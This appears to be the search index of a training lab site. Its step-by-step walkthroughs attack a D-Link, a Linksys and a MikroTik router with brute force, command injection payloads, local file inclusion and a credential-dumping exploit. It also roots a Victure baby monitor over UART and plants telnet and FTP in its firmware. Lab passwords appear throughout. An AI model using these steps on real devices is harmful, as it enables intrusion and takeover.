[{"content":"Run nmap against the target. The -Pn flag is used to scan ports even though nmap is not receiving a ping response from the device.\nnmap 172.21.0.23 -Pn You should see that only port 8080 is shown as open.\nHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.\rStarting Nmap 7.91 ( https://nmap.org ) at 2021-10-19 13:20 MDT\rNmap scan report for 172.21.0.23\rHost is up (0.010s latency).\rNot shown: 999 filtered ports\rPORT STATE SERVICE\r8080/tcp open http-proxy Open up a browser and navigate to http://172.21.0.23:8080\nYou can try logging in, but we should see that we don’t have the password.\n","description":"","tags":null,"title":"Discovery","uri":"/router-lab/dir-815/01-discovery/"},{"content":"We can see if the login has been configured with weak credentials by using a brute force attack with a password list. There are several tools to do this. We will use a Metasploit.\nMetasploit Metasploit is an exploitation framework that will allow us to select a target and run different modules. We will use a module created to automate login attempts against some dlink routers.\nIn a terminal, open up Metasploit. This will take a few seconds to boot up.\nmsf You will eventually get a console session.\nSearch for a dlink module thats an auxiliary type.\nsearch dlink type:auxiliary We get several results back.\nWe will be using the dlink_dir_session_cgi_http_login module.\nuse scanner/http/dlink_dir_session_cgi_http_login Each module has several fields that need to be set to run it. You can these fields by running show options.\nshow options Set the remote target IP.\nset RHOSTS 172.21.0.23 Set the remote port\nset RPORT 8080 Change the username to Admin.\nset USERNAME Admin Lastly, tell the module to stop once it finds a password\nset STOP_ON_SUCCESS true Now if we run show options again, we should see our fields updated.\nshow options Run the module run\rThe module should continue to try passwords until it finds the correct one.\nCreds: Admin:letmein\n","description":"","tags":null,"title":"Brute Force Login","uri":"/router-lab/dir-815/02-brute-force-login/"},{"content":"The DIR 815 is vulnerable to command injection once authenticated. Make sure you found the password from the previous steps.\nOpen Burpsuite For this step, we will use Burpsuite.\nClick the Kali drop down in the top left corner and search for Burp.\nOpen Burp. This may take a few seconds. Click Next Click Start Burp Navigate to “Proxy” \u003e “Intercept” tab and turn off Intercept.\nOpen Firefox Open Firefox and click on the “Foxy Proxy” extension. We need to select the option 127.0.0.1:8080. The “Foxy Proxy” extension should then get a green label above it.\nIn Firefox, navigate to http://172.21.0.23:8080/.\nNow in Burpsuite. Navigate to the “Proxy” \u003e “HTTP History” tab. You should see the traffic from loading the login page.\nUse the Ping Utility In Firefox, log into the DLINK router using the creds discovered from out brute force attack.\nThen navigate to Tools \u003e System Check:\nTry using the IPv6 ping utility.\nSend the request to the repeater tab.\nWe can see that the POST request body contains what look like shell commands to run ping.\nTest for Command Injection You can rerun the command a few times and see that it quickly resolves. We can test for command injection by using the sleep command. We don’t need to get any data back, but if the command takes longer to return, then we know that the sleep command is being evaluated. Try changing the body of the request to the following and sending.\nWe want to try to get the router to evaluate the following command:\nping6 ::1 \u0026\u0026 sleep 2\nBut it will need to be URL encoded. We can use Cyberchef to encode this. Click here\nOnce we have our command encoded, place it in our request in Burpsuite.\nact=ping6\u0026dst=::1%26%26%20sleep%202 We should see that the request takes 2 seconds to return, implying we have command injection.\nExamining the Code We know that the DLINK router is running firmware version 2.01. We’ve pulled the firmware and extracted the file system and found the code that is used for the ping diagnostic utility.We can notice the ping IPv4 is doing more than for IPv6. The IPv4 ping utility is not vulnerable to the same vector that we just tested.\nAnother script used with the ping utility shows which file the results are written and read from.\nExploiting Command Injection to Read Files. We want to inject the command to copy the contents of flag.txt to the file that is read for the ping results:\ncat /var/flag.txt \u003e /var/ping_result\nWe need to URL encode the payload again. You can do that with Cyberchef here.\nCopy and use the payload in Burp repeater.\nact=ping6\u0026dst=::1%26%26%20cat%20%2Fvar%2Fflag%2Etxt%20%3E%20%2Fvar%2Fping%5Fresult You should get the contents of /var/flag.txt in the response.\n","description":"","tags":null,"title":"Command Injection","uri":"/router-lab/dir-815/03-command-injection/"},{"content":"Demo This is text for the demo\n","description":"","tags":null,"title":"BLE","uri":"/ble/"},{"content":"Victure PC420 Baby Monitor Requirements Victure PC420 baby monitor camera with power cord USB to TTL adapter (Shikra, DSD Tech USB to TTL, etc.) Micro SD (at least 20 MB) Micro SD to USB adapter 3 Female to male jumper wires Computer ","description":"","tags":null,"title":"Victure PC420","uri":"/victure-pc420/"},{"content":"WiFi Lab Information SSID: iot-hack-lab Password: saintcon2021 Target CIDR: 172.21.0.1/24 nmap -sn -PS21,22,80,8000,8080 172.21.0.1/24 Please don’t ruin things for other people.\n","description":"","tags":null,"title":"Router Lab","uri":"/router-lab/"},{"content":"DIR-815 Host: 172.21.0.23 Must either be hardwired on a lab machine or be on the Wifi documented here.\nThis lab walks through exploiting the Dlink 815 using the following:\nUse Metasploit to bruteforce the login credentials Use Burpsuite to exploit command injection in the ping utility. ","description":"","tags":null,"title":"DIR-815","uri":"/router-lab/dir-815/"},{"content":"About This will guide you how to exploit a Mikrotik running Router Os.\nFirst, run nmap against the target to discover what ports are open. -Pn: scan the device even though its not responding to ping. --top-ports=4000 will scan the top 4000 most common service ports. The default is 1000, and will miss one of the open ports. nmap 172.21.0.4 --top-ports=4000 -Pn You should see that there are 2 open ports, 21 and 8291.\nnmap 172.21.0.4 --top-ports=4000 -Pn Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-18 13:20 MDT Nmap scan report for 172.21.0.4 Host is up (0.0047s latency). PORT STATE SERVICE 21/tcp open ftp 8291/tcp open unknown Do service discovery on the open ports by using the -sC flag. nmap 172.21.0.4 -p21,8291 -sC -Pn We should get back some additional information about what services are running.\nnmap 172.21.0.4 -p21,8291 -sC -Pn PORT STATE SERVICE 21/tcp open ftp | ftp-syst: |_ SYST: UNIX MikroTik 6.39.2 8291/tcp open unknown Nice. Now we know that this router is running MikroTik version 6.39.2.\n","description":"","tags":null,"title":"Discovery","uri":"/router-lab/mikrotik/01-discovery/"},{"content":"Local File Inclusion Run the following command to retrieve the flag:\ncurl --user 'admin:LvawK!*C@6MR!Cz#*V2$ze@#7v75iT' -X POST -d \"submit_type=wsc_method2\u0026change_action=gozila_cgi\u0026next_page=../../tmp/flag.txt\" http://172.21.0.15:8080/apply.cgi The next_page parameter in the request specifies the file we want to read. The content of the file will be returned in the response.\n","description":"","tags":null,"title":"Local File Inclusion","uri":"/router-lab/wrt160n/local-file-inclusion/"},{"content":"Mikrotik (Router OS 6.39.2) Host: 172.21.0.4 ","description":"","tags":null,"title":"MikroTik","uri":"/router-lab/mikrotik/"},{"content":"WRT160N Host: 172.21.0.15 Port: 8080 User: admin password: LvawK!*C@6MR!Cz#*V2$ze@#7v75iT Must be on the Wifi or hard wired to our network documented here.\n","description":"","tags":null,"title":"WRT160N","uri":"/router-lab/wrt160n/"},{"content":"After searching online, we find that the version of Mikrotik/RouterOS should be vulnerable to an exploit called “By The Way”\nExploitation The following versions of Router OS are vulnerable to “ByTheWay” exploit:\nLongterm: 6.30.1 - 6.40.7 Stable: 6.29 - 6.42 Beta: 6.29rc1 - 6.43rc3 The Tenable security team has created a POC for the “By The Way” exploit, found here: https://github.com/tenable/routeros/tree/master/poc/bytheway\nThe repo is already cloned, and the exploit compiled.\nNavigate to ~/routeros/poc/bytheway/build cd ~/routeros/poc/bytheway/build Run the exploit against the Mikrotik ./btw -i 172.21.0.4 You should see the following:\n╔╗ ┬ ┬ ┌┬┐┬ ┬┌─┐ ╦ ╦┌─┐┬ ┬ ╠╩╗└┬┘ │ ├─┤├┤ ║║║├─┤└┬┘ ╚═╝ ┴ ┴ ┴ ┴└─┘ ╚╩╝┴ ┴ ┴ [+] Attempting to connect to 172.21.0.4:8291 [+] Extracting user.dat... [+] Searching for administrator credentials [+] Using credentials - [[[CREDENTIALS HERE]]] [+] Creating /pckg/option on 172.21.0.4:8291 [+] Creating /flash/nova/etc/devel-login on 172.21.0.4:8291 [+] There's a light on We see that the exploit has extracted credentials for the admin user.\nLogin to FTP using the creds you got in step 2.\nftp 172.21.0.4 Use the username and password to login. It should look something like:\nName (172.21.0.4:user): admin 331 Password required for admin Password: 230 User admin logged in Remote system type is UNIX. In the FTP Prompt run passive to set the mode to Passive.\nftp\u003e passive Passive mode on. List the directory\nftp\u003e ls 227 Entering Passive Mode (172,21,0,4,191,152). 150 Opening data connection -rw-rw---- 1 root root 59 Oct 18 12:47 flag.txt drwxrwx--- 1 root root 1024 Dec 31 18:00 flash 226 Transfer complete Get the flag!\nftp\u003e get flag.txt local: flag.txt remote: flag.txt 227 Entering Passive Mode (172,21,0,4,208,214). 150 Opening ASCII mode data connection for /flag.txt (59 bytes) 226 ASCII transfer complete 59 bytes received in 0.00 secs (61.0999 kB/s) Exit FTP\nftp\u003e exit 221 Closing Print the flag. Use this to solve the Hacker Challenge. cat flag.txt Delete the flag so those after you don’t already have it. rm flag.txt ","description":"","tags":null,"title":"Exploitation","uri":"/router-lab/mikrotik/02-exploitation/"},{"content":"The first step in enabling remote connections is to dump the camera’s firmware.\nYou may notice that, though we have shell, basic commands like whoami seem to give errors\n/ # whoami whoami: unknown uid 0 This is because we bypassed the initialization scripts that would mount file systems and start and configure certain services.\nWe could simply run /init but the camera’s services all output to stdout which make it nearly impossible to use the shell. Thankfully, the services will log to a specific file if it exists when they are run.\nRun the following to ensure the services will only log to a file\nmount /mnt \u0026\u0026 mkdir /mnt/debug \u0026\u0026 touch /mnt/debug/log.txt Where,\nmount /mnt: Mounts the /mnt directory according to the /etc/fstab file mkdir /mnt/debug \u0026\u0026 touch /mnt/debug/log.txt: Creates the debug directory and the log file the services will log to Now we can safely run the initialization scripts. The scripts output to the console then start executing services in the background, dropping you back in the shell\n/etc/init.d/rcS mount all file system... mount: according to /proc/mounts, tmpfs is already mounted on /mnt starting mdev... ************************** Love Linux ! ! ! ************************** 200+0 records in 200+0 records out 102400 bytes (100.0KB) copied, 0.024803 seconds, 3.9MB/s find: insmod: No such file or directory aksensor_module_init aksensor 0-0001: Sensor ID error Running whoami shows us that the system has been initialized\n~ # whoami root Because we will be connecting remotely later on, lets update root’s password to something we know\n~ # passwd Changing password for root New password: Bad password: too short Retype password: Password for root changed by root Note: For the purpose of this guide, a simple password was used. It is advised to use a stronger password to avoid being easily compromised.\nConnect the micro SD card to the camera and run the following:\nmkdir /mnt/firmware cp /dev/mtdblock* /mnt/firmware/ Where,\ncp /dev/mtdblock* /mnt/firmware/: Copies the block devices that contain the firmware over to the micro SD card ","description":"","tags":null,"title":"Dump Firmware","uri":"/victure-pc420/configure-remote-connection/01-dump-firmware/"},{"content":"The following steps need to be done on the laptop\nThe block device that we need to modify is just a squashfs filesystem file.\nHome Only To extract the files from the firmware, lets install the squashfs tools\nsudo apt install squashfs-tools 2\u003e /dev/null Now connect the micro SD to the computer and mount the card\nsudo mkdir /mnt/pc420 sudo mount /dev/sdb1 /mnt/pc420 Now run the following to unsquash the root filesystem:\nunsquashfs -d rootfs /mnt/pc420/firmware/mtdblock4 Parallel unsquashfs: Using 6 processors 320 inodes (338 blocks) to write [===================-] 338/338 100% created 302 files created 17 directories created 18 symlinks created 0 devices created 0 fifos created 0 sockets Where,\nunsquashfs -d rootfs /mnt/pc420/firmware/mtdblock4: Unsquashes the mtdblock4 squashfs file and extracts the files to the rootfs directory Now we are going to update the initialization scripts to start telnet and ftp upon boot. Edit rootfs/etc/init.d/rcS and uncomment lines 7 and 8\necho \"start telnet......\" telnetd \u0026 Edit rootfs/etc/init.d/rc.local and uncomment line 13\n/bin/tcpsvd 0 21 ftpd -w / -t 600 \u0026 ","description":"","tags":null,"title":"Modify Firmware","uri":"/victure-pc420/configure-remote-connection/02-modify-firmware/"},{"content":" Home Only We will now connect to the Victure camera via the USB to TTL adapter.\nConnect the female ends of the jumper cables to the TX, RX, and GND pins on the USB to TTL adapter shown above. Once done, connect the adapter to the computer\nNow connect the male ends of the jumper cables to the camera’s UART ports according to the following table\nAdapter Camera GND GND TX RX RX TX screen can be used to connect to serial consoles. To connect to the adapter, run the following\nscreen /dev/ttyUSB3 115200 Where,\n/dev/ttyUSB3: Linux serial port for the USB to TTL adapter 115200: The baud rate (i.e. communication speed). 115200 is often the baud rate of UART devices. Home Only Note: Your serial port might not be /dev/ttyUSB3. You can disconnect the adapter from the computer, run ls /dev, reconnect the adapter and run ls /dev to determine the correct serial port to use.\nIt is now time to power the camera. Before doing so, make sure you are ready to press any key in the terminal where you ran the screen command to connect to the adapter’s serial console.\nOnce the camera is powered on, you should see something like this in the screen session\nU-Boot 2013.10.0-AK_V3.0.05 (Jan 11 2021 - 08:10:47) DRAM: 64 MiB 8 MiB Create flash partition table init OK! ak_sdhsmmc_init: ANYKA SDHC/MMC4.0: 0 Load Env CRC OK! In: serial Out: serial Err: serial reset pin value: 1 Hit any key to stop autoboot: 1 Press any key to stop the autoboot process. The following shell prompt should be shown\nanyka$ Note: If you weren’t fast enough, just simply disconnect and reconnect the power and try again.\n","description":"","tags":null,"title":"UART to U-Boot","uri":"/victure-pc420/02-uart-to-uboot/"},{"content":"Now that we have modified the initialization scripts, we are going to ‘resquash’ the files\nsudo mksquashfs rootfs /mnt/pc420/root.sqsh4 -comp xz Where,\nrootfs: The path to the directory containing the filesystem /mnt/pc420/root.sqsh4: The destination of the resulting squashfs file -comp xz: Compress the filesystem using xz Once complete, unmount the micro SD card\nsudo umount /mnt/pc420 ","description":"","tags":null,"title":"Build Firmware","uri":"/victure-pc420/configure-remote-connection/03-build-firmware/"},{"content":"The current shell is actually a U-Boot a limited shell. U-Boot is an open-source, primary boot loader. This shell has commands related to the booting process.\nanyka$ help ? - alias for 'help' base - print or set address offset bootm - boot application image from memory bootp - boot image via network using BOOTP/TFTP protocol chpart - change active partition cmp - memory compare cp - memory copy crc32 - checksum calculation downcheck_patition_update- load usr.sqsh4 tftp downimage- downimage - download and write All-Image to FLASH device,partiton table from ENV partition. downjffs2fs- load usr.jffs2 tftp downkernel- load uImage tftp ...\u003comitted for brevity\u003e... This U-Boot shell can be used to drop us into a root shell. To do so, run the following\nsetenv bootargs console=ttySAK0,115200n8 root=/dev/mtdblock4 rootfstype=squashfs init=/bin/sh mem=64M memsize=64M saveenv Saving Environment to SPI Flash... Env save done OK Where,\nsetenv bootargs args...: Sets the command line arguments that are passed to the kernel. The change here is init=/bin/sh. This means that instead of running /init when fully booted, /bin/sh will be run. saveenv: Saves the environment to Flash memory. Now disconnect and reconnect the power to the camera. Once fully booted, you should be dropped into a shell.\n/ # ls -lah total 3 drwxrwxr-x 13 1024 1028 162 Mar 2 2021 . drwxrwxr-x 13 1024 1028 162 Mar 2 2021 .. drwxr-xr-x 2 1024 1028 2.3K Oct 28 2019 bin drwxr-xr-x 3 0 root 0 Jan 1 00:00 dev drwxr-xr-x 5 1024 1028 283 Mar 2 2021 etc -rwxr-xr-x 1 1024 1028 2.7K Nov 22 2017 init drwxr-xr-x 3 1024 1028 816 Feb 9 2021 lib drwxr-xr-x 2 1024 1028 3 Feb 9 2017 mnt drwxr-xr-x 2 1024 1028 3 Feb 9 2017 proc drwxr-xr-x 2 1024 1028 1.4K Mar 2 2021 sbin drwxr-xr-x 2 1024 1028 3 Feb 9 2017 sys drwxr-xr-x 2 1024 1028 3 Feb 9 2017 tmp drwxr-xr-x 2 1024 1028 3 Mar 2 2021 usr drwxr-xr-x 3 1024 1028 26 Apr 14 2017 var ","description":"","tags":null,"title":"U-Boot to Root","uri":"/victure-pc420/03-uboot-to-root/"},{"content":"The following commands need to be run on the camera\nNow that we have the modified squashfs file, we can update the camera’s firmware. Plug the micro SD into the camera and run the following\n/usr/sbin/update.sh Where,\n/usr/sbin/update.sh: Runs the script to update the camera’s firmware The camera should reboot once it is done updating.\n","description":"","tags":null,"title":"Update Camera Firmware","uri":"/victure-pc420/configure-remote-connection/04-update-camera-firmware/"},{"content":"We have successfully been dropped into a root shell on the camera, but this required physical access. We are next going to update the camera’s firmware to run telnetd upon booting up, allowing us to connect to it remotely.\n","description":"","tags":null,"title":"Configure Remote Connection","uri":"/victure-pc420/configure-remote-connection/"},{"content":"Now that the firmware has been updated, we no longer need to boot to /bin/sh. To change the bootargs, follow the steps taken in the UART to U-Boot section to get into the U-Boot shell and run the following:\nsetenv bootargs console=ttySAK0,115200n8 root=/dev/mtdblock4 rootfstype=squashfs init=/init mem=64M memsize=64M saveenv Saving Environment to SPI Flash... Env save done OK Now disconnect and reconnect the power to the camera. The camera should not boot into a shell but should run our modified initialization scripts.\nWe now need to connect the camera to the WiFi. The first step to do this is to connect the computer to the WiFi the camera is broadcasting. The camera’s WiFi SSID should start with ‘Victure_’.\nOnce connected, run the following on the computer, replacing PASSWORD and SSID with the password and SSID of the WiFi it should connect to:\ngen_qr_code_str(){ qrcode_header='\\x68\\x00\\x00\\x00\\x80' victure_user=\"95c992cdf31fc7d0\" timezone=\"-7.00\" region=\"US\" wifi_type=\"WPA\" wifi_ssid=\"$1\" wifi_password=\"$2\" payload=\"WIFI:U:$victure_user;Z:$timezone;R:$region;T:$wifi_type;P:\\\"$wifi_password\\\";S:$wifi_ssid;\" ssidLength=\"${#wifi_ssid}\" passwordLength=\"${#wifi_password}\" payloadLength=\"${#payload}\" lengths=\"$passwordLength;$ssidLength;$payloadLength\" echo -en \"${qrcode_header}L:$lengths;$payload\" } gen_qr_code_str \"HP Office Jet 420\" \"omg pizza party\" | nc -v 10.1.8.1 6666 This sends the camera all of the info it needs in order to connect to the WiFi. Once done, you should see output in the screen session related to the camera connecting to the WiFi. Make note of the IP that is displayed once it has connected to the WiFi.\nSending select for 172.21.0.69... Lease of 172.21.0.69 obtained, lease time 14400 deleting routes route: SIOCDELRT: No such process adding dns 69.27.0.130 adding dns 69.27.0.131 totalsize [4857755] VmRSS [3672] [4020] VmSize [13104] no network for token interface [wlan0] ip [172.21.0.69] ","description":"","tags":null,"title":"Connect Camera to WiFi","uri":"/victure-pc420/configure-remote-connection/05-connect-camera-to-wifi/"},{"content":"Now that the camera is connected to the WiFi, we should be able to disconnect our USB to TTL adapter and remotely connect to it.\ntelnet 172.21.0.69 Trying 172.21.0.69... Connected to 172.21.0.69. Escape character is '^]'. anyka login: root Password: welcome to file system [root@anyka ~]$ uname -a Linux anyka 3.4.35 #9 Thu Feb 25 11:45:35 UTC 2021 armv5tejl GNU/Linux ","description":"","tags":null,"title":"Test Remote Connection","uri":"/victure-pc420/09-test-remote-connection/"},{"content":"in uboot (press enter after rebooting)\nsetenv bootargs console=ttySAK0,115200n8 root=/dev/mtdblock4 rootfstype=squashfs init=/bin/sh mem=64M memsize=64M saveenv reboot… wait for shell. plug in sd card\nmount /mnt /etc/init.d/rcS update.sh in uboot (press enter after rebooting)\nsetenv bootargs console=ttySAK0,115200n8 root=/dev/mtdblock4 rootfstype=squashfs init=/init mem=64M memsize=64M saveenv reboot\n","description":"","tags":null,"title":"Reset","uri":"/victure-pc420/10-reset/"},{"content":"","description":"","tags":null,"title":"Categories","uri":"/categories/"},{"content":"","description":"","tags":null,"title":"Tags","uri":"/tags/"}]